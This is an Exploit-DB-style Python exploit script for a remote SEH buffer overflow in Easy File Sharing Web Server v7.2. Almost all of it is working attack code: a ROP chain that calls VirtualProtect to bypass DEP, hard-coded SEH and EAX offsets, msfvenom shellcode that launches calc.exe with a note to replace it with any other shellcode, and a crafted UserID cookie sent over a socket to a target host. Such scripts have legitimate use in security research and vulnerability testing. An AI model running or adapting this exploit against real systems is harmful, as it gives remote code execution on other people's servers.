#!/usr/bin/env python
#
# Exploit title: Easy File Sharing Web Server v7.2 - Remote SEH Buffer Overflow (DEP bypass with ROP)
# Date: 29/11/2015
# Exploit Author: Knaps
# Contact: @TheKnapsy
# Website: http://blog.knapsy.com
# Software Link: http://www.sharing-file.com/efssetup.exe
# Version: Easy File Sharing Web Server v7.2
# Tested on: Windows 7 x64, but should work on any other Windows platform
#
# Notes:
# - based on non-DEP SEH buffer overflow exploit by Audit0r (https://www.exploit-db.com/exploits/38526/)
# - created for fun & practice, also because it's not 1998 anymore - gotta bypass that DEP! :)
# - bad chars: '\x00' and '\x3b'
# - max shellcode size allowed: 1260 bytes
#

import sys, socket, struct

# ROP chain generated with mona.py - www.corelan.be (and slightly fixed by @TheKnapsy)
# Essentially, use PUSHAD to set all parameters and call VirtualProtect() to disable DEP.
def create_rop_chain():

    rop_gadgets = [
	  # Generate value of 201 in EAX
	  0x10015442,  # POP EAX # RETN [ImageLoad.dll]
	  0xFFFFFDFF,  # Value of '-201'
	  0x100231d1,  # NEG EAX # RETN [ImageLoad.dll]
	
	  # Put EAX into EBX (other unneccessary stuff comes with this gadget as well...)
	  0x1001da09,  # ADD EBX,EAX # MOV EAX,DWORD PTR SS:[ESP+C] # INC DWORD PTR DS:[EAX] # RETN [ImageLoad.dll]
	  
	  # Carry on with the ROP as generated by mona.py
	  0x10015442,  # POP EAX # RETN [ImageLoad.dll] 
      0x61c832d0,  # ptr to &VirtualProtect() [IAT sqlite3.dll]
	
	  # Compensate for the ADD EBX,EAX gadget above, jump over 1 address, which is a dummy writeable location
	  # used solely by the remaining part of the above gadget (it doesn't really do anything for us)
	  0x1001281a,  # ADD ESP,4 # RETN [ImageLoad.dll]
	  0x61c73281,  # &Writable location [sqlite3.dll]
	
	  # And carry on further as generated by mona.py
	  0x1002248c,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [ImageLoad.dll] 
      0x61c18d81,  # XCHG EAX,EDI # RETN [sqlite3.dll]
      0x1001d626,  # XOR ESI,ESI # RETN [ImageLoad.dll] 
      0x10021a3e,  # ADD ESI,EDI # RETN 0x00 [ImageLoad.dll] 
      0x10013ad6,  # POP EBP # RETN [ImageLoad.dll] 
      0x61c227fa,  # & push esp # ret  [sqlite3.dll]
      0x10022c4c,  # XOR EDX,EDX # RETN [ImageLoad.dll] 
	  
	  # Now bunch of ugly increments... unfortunately couldn't find anything nicer :(
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x1001b4f6,  # POP ECX # RETN [ImageLoad.dll] 
      0x61c73281,  # &Writable location [sqlite3.dll]
      0x100194b3,  # POP EDI # RETN [ImageLoad.dll] 
      0x1001a858,  # RETN (ROP NOP) [ImageLoad.dll]
      0x10015442,  # POP EAX # RETN [ImageLoad.dll] 
      0x90909090,  # nop
      0x100240c2,  # PUSHAD # RETN [ImageLoad.dll] 
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

	
# Check command line args 
if len(sys.argv) <= 1:
    print "Usage: python poc.py [host] [port]"
    exit()

host = sys.argv[1]    
port = int(sys.argv[2])


# Offsets
rop_offset = 2455
max_size = 5000
seh_offset = 4059
eax_offset = 4183


# move ESP out of the way so the shellcode doesn't corrupt itself during execution
# metasm > add esp,-1500
shellcode =  "\x81\xc4\x24\xfa\xff\xff"

# Just as a PoC, spawn calc.exe. Replace with any other shellcode you want
# (maximum size of shellcode allowed: 1260 bytes)
#
# msfvenom -p windows/exec CMD=calc.exe -b '\x00\x3b' -f python
# Payload size: 220 bytes
shellcode += "\xbb\xde\x37\x73\xe9\xdb\xdf\xd9\x74\x24\xf4\x58\x31"
shellcode += "\xc9\xb1\x31\x31\x58\x13\x83\xe8\xfc\x03\x58\xd1\xd5"
shellcode += "\x86\x15\x05\x9b\x69\xe6\xd5\xfc\xe0\x03\xe4\x3c\x96"
shellcode += "\x40\x56\x8d\xdc\x05\x5a\x66\xb0\xbd\xe9\x0a\x1d\xb1"
shellcode += "\x5a\xa0\x7b\xfc\x5b\x99\xb8\x9f\xdf\xe0\xec\x7f\xde"
shellcode += "\x2a\xe1\x7e\x27\x56\x08\xd2\xf0\x1c\xbf\xc3\x75\x68"
shellcode += "\x7c\x6f\xc5\x7c\x04\x8c\x9d\x7f\x25\x03\x96\xd9\xe5"
shellcode += "\xa5\x7b\x52\xac\xbd\x98\x5f\x66\x35\x6a\x2b\x79\x9f"
shellcode += "\xa3\xd4\xd6\xde\x0c\x27\x26\x26\xaa\xd8\x5d\x5e\xc9"
shellcode += "\x65\x66\xa5\xb0\xb1\xe3\x3e\x12\x31\x53\x9b\xa3\x96"
shellcode += "\x02\x68\xaf\x53\x40\x36\xb3\x62\x85\x4c\xcf\xef\x28"
shellcode += "\x83\x46\xab\x0e\x07\x03\x6f\x2e\x1e\xe9\xde\x4f\x40"
shellcode += "\x52\xbe\xf5\x0a\x7e\xab\x87\x50\x14\x2a\x15\xef\x5a"
shellcode += "\x2c\x25\xf0\xca\x45\x14\x7b\x85\x12\xa9\xae\xe2\xed"
shellcode += "\xe3\xf3\x42\x66\xaa\x61\xd7\xeb\x4d\x5c\x1b\x12\xce"
shellcode += "\x55\xe3\xe1\xce\x1f\xe6\xae\x48\xf3\x9a\xbf\x3c\xf3"
shellcode += "\x09\xbf\x14\x90\xcc\x53\xf4\x79\x6b\xd4\x9f\x85"


buffer = "A" * rop_offset						# padding
buffer += create_rop_chain()
buffer += shellcode
buffer += "A" * (seh_offset - len(buffer))		# padding
buffer += "BBBB"								# overwrite nSEH pointer
buffer += struct.pack("<I", 0x1002280a)			# overwrite SEH record with stack pivot (ADD ESP,1004 # RETN [ImageLoad.dll])
buffer += "A" * (eax_offset - len(buffer))		# padding
buffer += struct.pack("<I", 0xffffffff)			# overwrite EAX to always trigger an exception
buffer += "A" * (max_size - len(buffer))		# padding


httpreq = (
"GET /changeuser.ghp HTTP/1.1\r\n"
"User-Agent: Mozilla/4.0\r\n"
"Host:" + host + ":" + str(port) + "\r\n"
"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
"Accept-Language: en-us\r\n"
"Accept-Encoding: gzip, deflate\r\n"
"Referer: http://" + host + "/\r\n"
"Cookie: SESSIONID=6771; UserID=" + buffer + "; PassWD=;\r\n"
"Conection: Keep-Alive\r\n\r\n"
)

# Send payload to the server
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.send(httpreq)
s.close()
